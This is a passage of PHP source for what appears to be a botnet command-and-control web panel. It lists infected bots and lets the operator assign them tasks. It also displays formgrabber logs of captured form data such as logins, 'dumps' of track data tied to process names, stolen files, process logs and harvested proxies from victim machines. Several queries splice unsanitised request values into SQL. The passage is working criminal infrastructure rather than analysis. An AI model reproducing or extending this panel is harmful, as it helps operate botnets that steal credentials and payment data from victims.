src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEgAAAAQCAMAAACC7snvAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkNCRTQ0RDcwMzlFODExRTRBM0VGODQ2NjQ4M0ZCNDdGIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkNCRTQ0RDcxMzlFODExRTRBM0VGODQ2NjQ4M0ZCNDdGIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6Q0JFNDRENkUzOUU4MTFFNEEzRUY4NDY2NDgzRkI0N0YiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6Q0JFNDRENkYzOUU4MTFFNEEzRUY4NDY2NDgzRkI0N0YiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz41c02nAAAAWlBMVEX///9JAgJvBQV8AgV9Bwd/BAqBAAPVBxfYAhHmAhTmGCXnBhj/AR3/ASD/AiH/BSH/BSX/DCf/DST/Eir/GCb/Giz/ICj/IC3/KCv/KC//LjH/U1P/X1////9Eo2rSAAAAAXRSTlMAQObYZgAAAQNJREFUOMutU9uOgyAUPN6qiMULIGvX8/+/uXNQk6bS7oMlw2SYzJnAA0SUl+VlEFa+rr+XkUnP4+dxGWtJ5TIvX0BO1ccA8yKb/62qKA9hfgue25ZDWzP4QwyoqArOexc2QG/YHdbBsXae66DfZaLj8TRnvZjeRo4Qh5mtA/m4NYuGE49H5mmqoMLaKQGetGbLNVjrGkU66t0/51E0TqOgfwKOrMdexoX7ketDy73EeZ1CUT8MCSA8cLPxMKCgOZxG6+acR1GyZxtXG6NWHTpyIl/QzXQmBbzAYBxCdQY3OXT0z3ncKN1jjFLIy4jCUYF3Hf1TviDK7t39MjL5/rcvLKI/xWJOTGTVfyAAAAAASUVORK5CYII=" title="Last access: ' . $row['bot_date'] . '"></td>';
                    }
                    echo '<td>' . urldecode($row['bot_lifetime']) . '</td>';
                    echo '<td style="text-align: center;vertical-align:middle;">' .
                        '<a href = "?act=tasks&csrf=' . $_SESSION['csrf'] . '&bot_uid=' . $row['bot_uid'] . '" title="Add a task to the current bot"><span class="glyphicon glyphicon-plus-sign"></a>&nbsp;' .
                        '<a href = "?act=clients&csrf=' . $_SESSION['csrf'] . '&bot_uid=' . $row['bot_uid'] . '&bot=kill" title="Remove the task from the database"><span class="glyphicon glyphicon-minus-sign"></a>&nbsp;' .
                        '<a data-toggle="modal" data-target="#add-comment-' . $i . '" href="#" title="Add comment to bot ' . $row['bot_comment'] . '"><span class="glyphicon glyphicon-comment"></a>' .
                        '</td></tr>';
                }
                echo '</tbody></table>';
                GetPagination($page, $str, $count_pages);
                ?>
            </div>
        </div>
        <?php
    } else {
        WarningBox('No bots in database!<br>');
    }
}
if ($act == 'ff')
{
    if (array_key_exists('delete', $_GET)) {
        if ($_SESSION['csrf'] != $_GET['csrf'])
            return;

        $bot_form_hash = $mysqli->real_escape_string($_GET['bot_form_hash']);
        QueryRedirect($mysqli, "DELETE FROM botnet_ff WHERE bot_form_hash='" . $bot_form_hash . "'", $ff);
    }

    if (array_key_exists('delete_all', $_GET)) {
        QueryRedirect($mysqli, 'truncate table botnet_ff', $ff);
    }

    if (array_key_exists('reset', $_GET)) {
        echo '<script>location="' . $ff . '";</script>';
    }

    $start_date = array_key_exists('dp1', $_GET) ? htmlentities($_GET['dp1']) : 0;
    $end_date = array_key_exists('dp2', $_GET) ? htmlentities($_GET['dp2']) : 0;
    $show_by_link = array_key_exists('show_by_link', $_GET) ? htmlentities($_GET['show_by_link']) : 0;
    $show_by_data = array_key_exists('show_by_data', $_GET) ? htmlentities($_GET['show_by_data']) : 0;
    $show_by_ip = array_key_exists('show_by_ip', $_GET) ? htmlentities($_GET['show_by_ip']) : 0;
    $show_by_uid = array_key_exists('show_by_uid', $_GET) ? htmlentities($_GET['show_by_uid']) : 0;
    $page = array_key_exists('page', $_GET) ? htmlentities($_GET['page']) : 0;

    $sql = 'SELECT * FROM botnet_ff';
    if ($start_date)
        $sql .= " WHERE `bot_date` BETWEEN STR_TO_DATE('" . $start_date . "','%Y-%m-%d')";
    if ($end_date) {
        if (strstr($sql, ' WHERE ') == FALSE)
            $sql .= " WHERE `bot_date` <= ";
        else
            $sql .= ' AND ';
        $sql .= "STR_TO_DATE('" . addslashes($end_date) . "','%Y-%m-%d')";
    }
    if ($start_date && !$end_date)
        $sql .= " AND STR_TO_DATE('" . date('Y-m-d') . "','%Y-%m-%d')";
    if ($show_by_link) {
        if (strstr($sql, ' WHERE ') == FALSE)
            $sql .= ' WHERE ';
        else
            $sql .= ' AND ';

        if ($sql)
            $sql .= "FROM_BASE64(bot_host) like '%" . addslashes($show_by_link) . "%'";
        else
            $sql .= "`bot_host` like '%" . substr(base64_encode($show_by_link . "=="), 0, -8) . "%'";
    }
    if ($show_by_data) {
        if (strstr($sql, ' WHERE ') == FALSE)
            $sql .= ' WHERE ';
        else
            $sql .= ' AND ';
        if ($sql)
            $sql .= "FROM_BASE64(bot_form) like '%" . addslashes($show_by_data) . "%'";
        else
            $sql .= "`bot_form` like '%" . substr(base64_encode($show_by_data . "=="), 0, -8) . "%'";
    }
    if ($show_by_ip) {
        if (strstr($sql, ' WHERE ') == FALSE)
            $sql .= ' WHERE ';
        else
            $sql .= ' AND ';
        $sql .= "`bot_ip` like '%" . $show_by_ip . "%'";
    }
    if ($show_by_uid) {
        if (strstr($sql, ' WHERE ') == FALSE)
            $sql .= ' WHERE ';
        else
            $sql .= ' AND ';
        $sql .= "`bot_uid` = '" . addslashes($show_by_uid) . "'";
    }

    if (array_key_exists('delete_by_filter', $_GET)) {
        QueryRedirect($mysqli, str_replace('SELECT *', 'DELETE', $sql), $ff);
    }
    if (array_key_exists('export', $_GET)) {
        ExportFF($mysqli, $sql);
    }

    $logs_count = fast_count_sql($mysqli, $sql);
    if ($logs_count <= 0) {
        die(WarningBox('No logs in database!'));
    }

    $count_pages = floor($logs_count / $page_limit);
    if ($page) {
        $lim = floor($page * $page_limit);
        $sql .= " LIMIT $lim, $page_limit";
    } else
        $sql .= " LIMIT 0, $page_limit";

    $qstring = $_SERVER['QUERY_STRING'];
    $q_str = explode("&", $qstring);
    $str = "";

    foreach ($q_str as $s_str) {
        if (strstr($s_str, "page"))
            break;
        else
            $str .= htmlspecialchars($s_str) . "&";
    }


    $start = abs($page * $page_limit);
    $res = $mysqli->query($sql);
    ?>

<div class="panel panel-primary" style="margin: 0 auto;overflow: hidden">
    <div class="panel-heading">
        <b>Formgrabber<i> (<?php echo $logs_count ?>) </i></b>
    </div>
    <div class="modal fade" id="confirm-delete">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
                    <h4 class="modal-title">Search filter</h4>
                </div>
                <form method="GET" action="">
                    <input type="hidden" name="act" value="ff">

                    <div class="input-group input-group-sm">
                        <span class="input-group-addon">  Start search from date :</span>
                        <input type="text" class="form-control " style="width: 50%" id="dp1" name="dp1"
                            <?php if ($start_date) {
                                echo "value =\"" . htmlspecialchars($start_date) . "\"";
                            } ?>>

                        <input type="text" class="form-control" style="width: 50%" id="dp2" name="dp2"
                            <?php if ($end_date) {
                                echo "value =\"" . htmlspecialchars($end_date) . "\"";
                            } ?>>
                    </div>

                    <div class="input-group input-group-sm" style="width: 100%">
                        <span class="input-group-addon">By link :</span>
                        <input class="form-control" type="text" name="show_by_link" placeholder="example.com"
                            <?php if ($show_by_link) {
                                echo "value =\"" . htmlspecialchars($show_by_link) . "\"";
                            } ?>>
                    </div>

                    <div class="input-group input-group-sm" style="width: 100%">
                        <span class="input-group-addon">By form data :</span>
                        <input class="form-control" type="text" name="show_by_data" placeholder="login="
                            <?php if ($show_by_data) {
                                echo "value =\"" . htmlspecialchars($show_by_data) . "\"";
                            } ?>>
                    </div>

                    <div class="input-group input-group-sm" style="width: 100%">
                        <span class="input-group-addon">By bot ip :</span>
                        <input class="form-control" type="text" name="show_by_ip"
                            <?php if ($show_by_ip) {
                                echo "value =\"" . htmlspecialchars($show_by_ip) . "\"";
                            } ?>>
                    </div>

                    <div class="input-group input-group-sm" style="width: 100%">
                        <span class="input-group-addon">By machine id :</span>
                        <input class="form-control" type="text" name="show_by_uid"
                            <?php if ($show_by_uid) {
                                echo "value =\"" . htmlspecialchars($show_by_uid) . "\"";
                            } ?>>
                    </div>
                    <br>
                    <div class="modal-footer">
                        <button type="submit" class="btn btn-primary btn-ok" name="show">Search</button>
                        <button type="submit" class="btn btn-default" name="reset">Reset search</button>
                        <button type="button" class="btn btn-default" data-dismiss="modal">Cancel</button>
                    </div>
                </form>
            </div>
        </div>
    </div>
    <ul class="nav nav-tabs">
        <form action="" method="GET" class="navbar-form navbar-right" role="search">
            <input type="hidden" name="act" value="ff">

            <div class="form-group">
                <input class="form-control" name="show_by_link" placeholder="Search" type="text">
            </div>
            <button type="submit" class="btn btn-default">Submit</button>
            <div class="btn-group">
                <a href="#" class="btn btn-default dropdown-toggle" data-toggle="dropdown">
                    Menu
                    <span class="caret"></span>
                </a>
                <ul style="z-index: 999;" class="dropdown-menu">
                    <li><a data-toggle="modal" data-target="#confirm-delete" href="#"><span
                                class="glyphicon glyphicon-search"></span> Advanced search</a></li>
                    <li role="separator" class="divider"></li>
                    <li><a href="<?php echo '?' . $_SERVER['QUERY_STRING'] . '&export'; ?>"><span
                                class="glyphicon glyphicon-floppy-saved"></span> Download logs by current filter</a>
                    </li>
                    <li><a href="#"
                           onclick="ConfirmDelete('<?php echo '?' . $_SERVER['QUERY_STRING'] . '&delete_by_filter'; ?>'); return false;"><span
                                class="glyphicon glyphicon-floppy-remove"></span> Delete logs by current filter</a>
                    </li>
                    <li role="separator" class="divider"></li>
                    <li><a href="#"
                           onclick="ConfirmDelete('?act=ff&delete_all=Delete+all'); return false;"><span
                                class="glyphicon glyphicon-floppy-remove"></span> Delete all logs</a>
                    </li>
                </ul>
            </div>
        </form>
    </ul>
    <?php
    if ($res && $res->num_rows != 0) {
        echo '<div id="wrapper">'
            . '<table style="font-size:9pt;" id="example" class="table table-responsive table-condensed table-hover">'
            . '<th><b>IP</th>'
            . '<th><b>ID</th>'
            . '<th><b>Host</th>'
            . '<th><b>Request</th>'
            . '<th><b>Browser</th>'
            . '<th><b>Date \ Time</th>'
            . '<th><b>Details</th>'
            . '<tbody>';

        for ($i = 0; $i < $res->num_rows; $i++) {
            $row = $res->fetch_assoc();
            $host_link = base64_decode($row['bot_host']);
            $var = str_replace('&', PHP_EOL, base64_decode($row['bot_form']));

            echo '<div class="modal fade" id="show-details-' . $i . '">'
                . '<div class="modal-dialog">'
                . '<div class="modal-content">'
                . '<div class="modal-header">'
                . '<button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>'
                . '<h4 class="modal-title">Request details</h4>'
                . '</div>'
                . '<form method="GET" action="">'
                . '<input type="hidden" name="act" value="ff">'
                . '<input type="hidden" name="bot_form_hash" value="' . $row['bot_form_hash'] . '">'
                . '<input name="csrf" type="hidden" value="' . $_SESSION['csrf'] . '">'
                . '<textarea style="width:100%;resize: none;" rows="10" cols="45">'
                . urldecode($var)
                . '</textarea>'
                . '<div class="modal-footer">'
                . '<button type="submit" class="btn btn-danger btn-ok" name="delete">Delete record</button>'
                . '<button type="button" class="btn btn-default" data-dismiss="modal">Cancel</button>'
                . '</div>'
                . '</form>'
                . '</div>'
                . '</div>'
                . '</div>';

            if (!strstr($host_link, 'http://') and !strstr($host_link, "https://"))
                $host_link = 'http://' . $host_link;

            echo '<tr>'
                . '<td><b> ' . $row['bot_ip'] . '</td>'
                . '<td><a href = "?act=ff&show_by_uid=' . $row['bot_uid'] . '"title="Show by this ID">' . $row['bot_uid'] . '</a></td>'
                . '<td><b><a href = "?act=ff&show_by_link=' . base64_decode($row["bot_host"]) . '"title="Search by link">' . my_substr($host_link, 60) . '</a> <a target="_blank" href = "' . "./redirect.php?url=" . $host_link . '" title="Open \'' . $host_link . '\' (Safe link)"><span style="text-align: center;vertical-align:middle;"  class="glyphicon glyphicon-share-alt"></span></a></td>'
                . '<td>'
                . my_substr(htmlentities(base64_decode($row['bot_form'])), 50)
                . '</td>'
                . '<td><img src="data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH/C1hNUCBEYXRhWE1QPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNS4wLWMwNjAgNjEuMTM0Nzc3LCAyMDEwLzAyLzEyLTE3OjMyOjAwICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIiB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlUmVmIyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ1M1IFdpbmRvd3MiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6NUM4NjA2NjM4OTYxMTFFNEIwMDREN0MzODg1MDNCMUUiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6NUM4NjA2NjQ4OTYxMTFFNEIwMDREN0MzODg1MDNCMUUiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo1Qzg2MDY2MTg5NjExMUU0QjAwNEQ3QzM4ODUwM0IxRSIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo1Qzg2MDY2Mjg5NjExMUU0QjAwNEQ3QzM4ODUwM0IxRSIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PgH//v38+/r5+Pf29fTz8vHw7+7t7Ovq6ejn5uXk4+Lh4N/e3dzb2tnY19bV1NPS0dDPzs3My8rJyMfGxcTDwsHAv769vLu6ubi3trW0s7KxsK+urayrqqmop6alpKOioaCfnp2cm5qZmJeWlZSTkpGQj46NjIuKiYiHhoWEg4KBgH9+fXx7enl4d3Z1dHNycXBvbm1sa2ppaGdmZWRjYmFgX15dXFtaWVhXVlVUU1JRUE9OTUxLSklIR0ZFRENCQUA/Pj08Ozo5ODc2NTQzMjEwLy4tLCsqKSgnJiUkIyIhIB8eHRwbGhkYFxYVFBMSERAPDg0MCwoJCAcGBQQDAgEAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==" class="' . strtolower($row['bot_browser']) . '" title="' . $row['bot_browser'] . '"</td>'
                . '<td>' . $row['bot_date'] . '</td>'
                . '<td><button data-toggle="modal" data-target="#show-details-' . $i . '" type="button" class="btn btn-xs btn-primary">Details</button></td>'
                . '</tr>';

            $start++;
        }
        echo '<tbody></table></div>';
        GetPagination($page, $str, $count_pages);
    }
    echo '</div>';
}
if ($act == 'logs') {

    $file_count = $mysqli->query('SELECT * FROM botnet_files')->num_rows;
    $process_count = $mysqli->query('SELECT * FROM botnet_logs')->num_rows;
    $plugin_count = $mysqli->query('SELECT * FROM botnet_plugin')->num_rows;

    $search = array_key_exists('search', $_GET) ? htmlentities($_GET['search']) : '';
    $action = array_key_exists('form', $_GET) ? htmlentities($_GET['form']) : '';
    $current_tab = isset($_REQUEST['do']) ? htmlentities($_REQUEST['do']) : 'files';

    echo '<div class="panel panel-primary" style="margin: 0 auto;overflow: hidden">'
        . '<div class="panel-heading"><b>Files & Logs</b></div>'
        . '<div class="panel-body">';
    ?>
    <ul class="nav nav-tabs">
        <li><a href="?act=logs&do=files">Filelist <span class="badge"><?php echo $file_count; ?></span></a></li>
        <li><a href="?act=logs&do=process">Process list <span class="badge"><?php echo $process_count; ?></span></a>
        </li>
        <li><a href="?act=logs&do=plugin">Plugin logs <span class="badge"><?php echo $plugin_count; ?></span></a></li>
        <form action="" method="get" class="navbar-form navbar-right" role="search">
            <input type="hidden" name="act" value="logs">
            <input type="hidden" name="do" value="<?php echo $current_tab; ?>">

            <div class="form-group">
                <input class="form-control" name="search" placeholder="Search" type="text"
                       value="<?php echo $search; ?>">
            </div>
            <button type="submit" class="btn btn-default">Search</button>
            <div class="btn-group">
                <a href="#" class="btn btn-default dropdown-toggle" data-toggle="dropdown">
                    Menu
                    <span class="caret"></span>
                </a>
                <ul class="dropdown-menu">
                    <li><a href="#"
                           onclick="ConfirmDelete('?act=logs&do=<?php echo $current_tab; ?>&form=download'); return false;">
                            <span class="glyphicon glyphicon-floppy-saved"></span> Save all <?php echo $current_tab; ?>
                        </a></li>
                    <li>
                        <a href="#"
                           onclick="ConfirmDelete('?act=logs&do=<?php echo $current_tab; ?>&form=deleteall'); return false;">
                            <span class="glyphicon glyphicon-floppy-remove"></span> Delete
                            all <?php echo $current_tab; ?></a>
                    </li>
                </ul>
            </div>
        </form>
    </ul>
</div>
    <?php
    switch ($action) {
        case 'delete':
            if ($do == null || $do == 'files') {
                $filename = $mysqli->real_escape_string($_GET['file_hash']);
                unlink('./files/' . $filename);
                QueryRedirect($mysqli, "DELETE FROM botnet_files WHERE file_hash='" . $filename . "'", $bots_files);
            } else if ($do == 'process') {
                QueryRedirect($mysqli, "DELETE FROM botnet_logs WHERE event_hash='" . $mysqli->real_escape_string($_GET['event_hash']) . "'", $log);
            } else if ($do == 'plugin') {
                QueryRedirect($mysqli, "DELETE FROM botnet_plugin WHERE event_hash='" . $mysqli->real_escape_string($_GET['event_hash']) . "'", $plugin);
            }
            break;
        case 'deleteall':
            if ($do == 'plugin') {
                QueryRedirect($mysqli, "truncate botnet_plugin", $plugin);
            } else if ($do == 'process') {
                QueryRedirect($mysqli, "truncate botnet_logs", $bots_logs);
            } else if ($do == 'files') {
                DeleteAll('files');
                QueryRedirect($mysqli, "truncate botnet_files", $bots_files);
            }
            break;
        case 'download':
            $archive_name = 'files_(' . date('Y-m-d_H-i-s') . ').zip';
            $destantion = './upload/' . $archive_name;

            if (zip_sql('./files/', $destantion, $mysqli, DB_FILES)) {
                echo '<script>ReloadPage("<b>Export succesfully!</b>' . '<br>' . 'File moved to \'Upload\', filename - ' . $archive_name . '", "' . $bots_logs . '");</script>';
            }
            break;
    }

    if ($do == null || $do == 'files') {
        if ($file_count <= 0)
            die('<div style="margin: 0 auto;overflow: hidden;text-align: center"><b>No files in directory!</b></div><br>');
        ParseFiles($mysqli, 'files');
    }
    if ($do == 'process') {
        if ($process_count <= 0)
            die('<div style="margin: 0 auto;overflow: hidden;text-align: center"><b>No records in database!</b></div><br>');

        if (array_key_exists('delete_all', $_GET)) {
            QueryRedirect($mysqli, 'truncate table botnet_logs', $log);
        }
        ParseDb($mysqli, 'process');
    }
    if ($do == 'plugin') {
        if ($plugin_count <= 0)
            die('<div style="margin: 0 auto;overflow: hidden;text-align: center"><b>No records in database!</b></div><br>');
        ParseDb($mysqli, 'plugin');
    }
    echo '</div>';
}
if ($act == 'dumps') {

    if (array_key_exists('form', $_GET) == 'kill') {
        $track_hash = htmlspecialchars(addslashes($_GET['track_hash']));
        QueryRedirect($mysqli, "DELETE FROM botnet_dumps WHERE track_hash='" . $track_hash . "'", $dumps);
    }

    if (array_key_exists('delete_all', $_GET)) {
        QueryRedirect($mysqli, 'truncate table botnet_dumps', $dumps);
    }

    if (array_key_exists('export', $_POST)) {
        ExportDumps($mysqli);
    }

    $sql = 'SELECT * FROM botnet_dumps';
    $dumps_count = $mysqli->query("SELECT * FROM botnet_dumps")->num_rows;

    $page = array_key_exists('page', $_GET) ? $_GET['page'] : 0;
    if ($page) {
        $lim = floor($page * $page_limit);
        $sql .= " LIMIT $lim, $page_limit";
    } else {
        $sql .= " LIMIT 0, $page_limit";
    }

    $count_pages = floor($dumps_count / $page_limit);
    $qstring = $_SERVER['QUERY_STRING'];
    $q_str = explode("&", $qstring);
    $str = "";
    foreach ($q_str as $s_str) {
        if (strpos($s_str, "page")) {
            break;
        } else {
            $str .= htmlspecialchars($s_str) . "&";
        }
    }
    $res = $mysqli->query($sql);
if ($res->num_rows != 0) {
    ?>
<div class="panel panel-primary" style="width: 70%;margin: 0 auto;overflow: hidden;">
    <div class="panel-heading"><b>Dumps (<?php echo $dumps_count; ?>)</b></div>
    <div class="panel-body">
    <br>
    <?php
    echo '<table style="font-size:9pt;" class="table table-striped table-condensed table-hover">'
        . '<th>#</th>'
        . '<th><b>ID</th>'
        . '<th><b>IP</th>'
        . '<th><b>Track data</th>'
        . '<th><b>Process name</th>'
        . '<th><b>Date</th>'
        . '<th><b>Action</th>';

    for ($i = 0; $i < $res->num_rows; $i++) {
        $row = $res->fetch_assoc();
        $track_data = base64_decode($row["track_data"]);
        echo '<tbody><tr>'
            . '<td style="width=5%"><b>' . $i . '<b></td>'
            . '<td style="width=5%"><a href = "?act=ff&show_by_uid=' . $row['bot_uid'] . '" title="Show bot logs">' . $row['bot_uid'] . '</td>'
            . '<td style="width=5%">' . $row["bot_ip"] . '</td>'
            . '<td style="width=55%">'
            . '<div class="input-group">'
            . '<span class="input-group-addon">' . $row["track_type"] . '</span>'
            . '<input class="form-control" type="text" value="' . $track_data . '">'
            . '</div>'
            . '</td>'
            . '<td style="width=15%">' . $row['process_name'] . '</td>'
            . '<td style="width=10%">' . $row['bot_date'] . '</td>'
            . '<td style="width=5%"><a href="?act=dumps&track_hash=' . $row['track_hash'] . '&form=kill" title="Delete"><span class="glyphicon glyphicon-remove"></span></a></td></tr>';
    }
    echo '<tbody></table>';
    ?>
    <form method="POST" action="">
        <input type="hidden" name="act" value="dumps">

        <div style="text-align: right">
            <input class="btn btn-primary btn-xs" type="submit" name="export" value="Export">
            <input onclick="ConfirmDelete('?act=dumps&delete_all=Delete+all'); return false"
                   class="btn btn-warning btn-xs"
                   type="submit" name="delete_all" value="Delete all"> <br>
        </div>
    </form>
    <?php
    GetPagination($page, $str, $count_pages);
    echo '</div></div>';
} else {
    WarningBox('No dumps in database!');
}
}
if ($act == 'proxy') {

    $sql = 'SELECT * FROM botnet_proxy';
    $proxy_list_link = $main_url . 'proxy.php?authkey=' . $key_tologin;
    $proxy_list_text = 'Direct link to proxy list:<br> <a href=' . $proxy_list_link . ' target=_blank>' . $proxy_list_link . '</a>';

    $query_string = $_SERVER['QUERY_STRING'];
    parse_str($query_string, $query_string);

    $delete_proxy = array_key_exists('proxy_hash', $query_string) ? htmlentities($query_string['proxy_hash']) : null;
    if ($delete_proxy) {
        QueryRedirect($mysqli, 'DELETE FROM ' . DB_PROXY . ' WHERE proxy_hash="' . $delete_proxy . '"', $proxy_url);
    }

    $delete_all_proxy = array_key_exists('delete_all', $query_string) ? htmlentities($query_string['delete_all']) : null;
    if ($delete_all_proxy) {
        QueryRedirect($mysqli, 'truncate table ' . DB_PROXY . '', $proxy_url);
    }

    $search_by_ip = array_key_exists('search_by_ip', $_GET) ? htmlentities($_GET['search_by_ip']) : null;
    if ($search_by_ip) {
        $sql .= ' WHERE bc_ip LIKE "%' . $search_by_ip . '%"';
    }

    $proxies_count = $mysqli->query($sql)->num_rows;
    if ($proxies_count == 0) {
        die(WarningBox('No proxies in database!'));
    }

    $count_pages = floor($proxies_count / $page_limit);
    $page = array_key_exists('page', $_GET) ? $_GET['page'] : 0;
    if ($page) {
        $lim = floor($page * $page_limit);
        $sql .= " LIMIT $lim, $page_limit";
    } else {
        $sql .= " LIMIT 0, $page_limit";
    }

    $str = null;
    foreach (explode('&', $_SERVER['QUERY_STRING']) as $s_str) {
        if (strpos($s_str, 'page')) {
            break;
        } else {
            $str .= htmlspecialchars($s_str) . '&';
        }
    }

    $res = $mysqli->query($sql);
    if ($res->num_rows != 0) {
        ?>
        <div class="panel panel-primary" style="width: 90%;margin: 0 auto;overflow: hidden;">
        <div class="panel-heading"><b>Proxy list (<?php echo $proxies_count; ?>)</b></div>
        <form action="" method="GET" class="navbar-form navbar-right" role="search" style="margin-right: 1px;">
            <input type="hidden" name="act" value="proxy">
            <div class="form-group">
                <input class="form-control" name="search_by_ip" placeholder="Search by ip" type="text"
                       value="<?php echo $search_by_ip; ?>">
            </div>
            <button type="submit" class="btn btn-default">Search</button>
            <div class="btn-group">
                <a href="#" class="btn btn-default dropdown-toggle" data-toggle="dropdown">
                    Menu
                    <span class="caret"></span>
                </a>
                <ul style="z-index: 999;" class="dropdown-menu">
                    <li>
                        <a href="#" onclick="Alert('<?php echo $proxy_list_text; ?>'); return false;">
                            <span class="glyphicon glyphicon-floppy-saved"></span> Get ip:port list</a>
                    </li>
                    <li role="separator" class="divider"></li>
                    <li>
                        <a href="config.php"></a>
                        <a href="#" onclick="ConfirmDelete('?act=proxy&delete_all=1'); return false;">
                            <span class="glyphicon glyphicon-floppy-remove"></span> Delete all proxies</a>
                    </li>
                </ul>
            </div>
        </form>
        <div class="panel-body">
        <?php
        echo '<table class="table table-condensed table-hove">'
            . '<th>#</th>'
            . '<th><b>ID</th>'
            . '<th><b>Bot IP</th>'
            . '<th><b>Proxy:port</th>'
            . '<th><b>Country</th>'
            . '<th><b>Join date</th>'
            . '<th style="text-align: center"><b>Action</th>';
        for ($i = 0; $i < $res->num_rows; $i++) {
            $row = $res->fetch_assoc();
            echo '<tbody><tr>'
                . '<td style="width=5%"><b>' . $i . '<b></td>'
                . '<td style="width=5%"><a href = "?act=ff&show_by_uid=' . $row['bot_uid'] . '" title="Show bot logs">' . $row['bot_uid'] . '</td>'
                . '<td style="width=5%">' . $row["bot_ip"] . '</td>'
                . '<td style="width=55%">' . $row['bc_ip'] . ":" . $row['bc_port'] . '</td>'
                . '<td style="vertical-align: middle;">' . ShowFlag($row['bot_country'], $country_array[$row['bot_country']]) . '&nbsp;' . $country_array[$row['bot_country']] . '(' . $row['bot_country'] . ')' . '</td>'
                . '<td style="width=10%">' . $row['bot_date'] . '</td>'
                . '<td style="width=5%;text-align: center"><a href="?act=proxy&proxy_hash=' . $row['proxy_hash'] . '&form=kill" title="Delete"><span class="glyphicon glyphicon-remove"></span></a></td></tr>';
        }
        echo '<tbody></table>';
        GetPagination($page, $str, $count_pages);
        echo '</div></div>';
    }
}
if ($act == 'settings') {

    echo '<div class="panel panel-primary" style="width: 40%;margin: 0 auto;overflow: hidden;">' .
        '<div class="panel-heading"><b>Settings</b></div>' .
        '<div class="panel-body">' .
        '<ul class="nav nav-tabs">' .
        '<li><a href="?act=settings">Settings</a></li>';
    if ($_COOKIE['uid'] == 'admin') {
        echo '<li><a href="?act=settings&do=accountlist">Accounts</a></li>';
    }
    echo '<li><a href="?act=settings&do=blacklist">Blacklist</a></li>' .
        '<li><a href="?act=settings&do=ffsettings">Formgrabber settings</a></li>' .
        '</ul>' .
        '</div>';

    if ($do == null) {
        if (array_key_exists('save', $_POST)) {
            if ($_SESSION['csrf'] != $_POST['csrf']) {
                return;
            }
            if (isset($_POST['enable_ban']) == 'checked') {
                $mysqli->query("UPDATE admin_config SET name='checked' WHERE id = 1");
            } else {
                $mysqli->query("UPDATE admin_config SET name='' WHERE id = 1");
            }
            if (isset($_POST['enable_scr']) == 'checked') {
                $mysqli->query("UPDATE admin_config SET name='checked' WHERE id = 3");
            } else {
                $mysqli->query("UPDATE admin_config SET name='' WHERE id = 3");
            }
            if (array_key_exists('rate', $_POST)) {
                refresh_rate($mysqli, 'set', htmlspecialchars(addslashes($_POST['rate'])));
            }
        }

        $ban_enabled = $mysqli->query('SELECT name FROM admin_config WHERE id = 1')->fetch_row();
        $scr_enabled = $mysqli->query('SELECT name FROM admin_config WHERE id = 3')->fetch_row();
        $refresh_rate = refresh_rate($mysqli, 'get', null);

        echo '<form method="post" action="">' .
            '<div class="input-group">' .
            '<span class="input-group-addon">Knock timeout (min.) :</span>' .
            '<input type="text" id="rate" class="form-control" style="width: 85%" name="rate" value="' . $refresh_rate . '">' .
